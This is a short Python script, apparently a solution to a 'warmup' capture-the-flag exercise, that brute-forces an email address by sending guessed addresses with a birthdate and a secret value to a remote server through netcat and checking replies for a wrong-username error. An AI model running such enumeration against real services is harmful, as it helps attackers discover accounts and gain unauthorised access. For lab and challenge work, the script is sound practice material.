import itertools
import string
import subprocess
from subprocess import TimeoutExpired

import numpy as np

from warmup.constants import (
    BIRTHDATE,
    CAMEL,
    DOMAIN,
    PORT,
    SERVER,
    USERNAME,
    WRONG_USERNAME_ERROR,
)


def brute_force_email() -> str | None:
    suffixes = list(
        itertools.chain(
            "".join(suffix)
            for i in range(1, 3)
            for suffix in itertools.product(
                string.ascii_lowercase, repeat=i
            )
        )
    )[332:333]
    total_attempts = len(suffixes)
    digits = int(np.log10(total_attempts)) + 1

    for attempt, suffix in enumerate(suffixes, 1):
        email = f"{USERNAME}{suffix}{DOMAIN}"
        payload = f"{email} {BIRTHDATE} {CAMEL}\n"

        print(f"[{attempt:0{digits}d}/{total_attempts}] {email}")

        try:
            result = subprocess.run(
                ["nc", SERVER, str(PORT)],
                capture_output=True,
                check=True,
                input=payload,
                text=True,
                timeout=5,
            )
        except TimeoutExpired:
            print("[TIMEOUT]")
            continue

        if (
            (stdout := result.stdout) is not None
            and (stdout := stdout.strip())
            and WRONG_USERNAME_ERROR not in stdout
        ):
            print(stdout)
            return email

    return None
